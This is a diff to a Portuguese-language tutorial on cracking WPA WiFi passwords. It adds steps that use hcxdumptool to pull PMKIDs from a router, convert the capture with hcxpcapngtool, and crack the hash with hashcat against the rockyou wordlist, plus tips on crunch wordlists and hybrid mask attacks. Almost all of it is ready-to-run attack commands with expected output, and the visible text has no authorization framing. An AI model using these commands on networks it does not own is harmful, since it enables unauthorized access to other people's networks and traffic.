@@ -44,6 +44,22 @@ Quando o `airodump-ng` mostrar **WPA handshake** no topo da tela, você pode par
 
 Isso vai gerar um arquivo `captura-01.cap`.
 
+### Capturar Handshake com PMKID + Hashcat
+###### Caso não tenha a ferramenta instalada:
+	sudo apt install hashcat hcxdumptool hcxpcapngtool
+
+####### Use o `hcxdumptool` para pedir PMKID ao roteador:
+	sudo hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1
+
+- Deixe rodar por 30–60s para garantir que capture o PMKID.
+- Depois pressione CTRL+C para parar.
+
+###### Transforme o arquivo `.pcapng` em hash compatível:
+	hcxpcapngtool -o hash.22000 captura.pcapng
+
+###### Se der certo, você verá algo como:
+	Written 1 PMKID(s) to hash.22000
+
 ---
 ### 5️⃣ Quebrar a Senha
 
@@ -55,6 +71,18 @@ Isso vai gerar um arquivo `captura-01.cap`.
 
 Se a senha estiver na lista, ele vai exibir algo assim:
 	KEY FOUND! [ MinhaSenha123 ]
+
+###### Quebrar senha com hashcat:
+	hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
+
+###### Interpretar resultado
+###### Se encontrar a senha, Hashcat vai mostrar no terminal algo como:
+	<hash> : minha_senha_encontrada
+
+Se não encontrar, você pode tentar:
+- Criar wordlist personalizada com `crunch`.
+- Usar regras diferentes.
+- Testar ataques híbridos (`hashcat ... ?d?d?d` para números no final).
 
 ---
 ### 6️⃣ (Opcional) Criar Sua Própria Wordlist
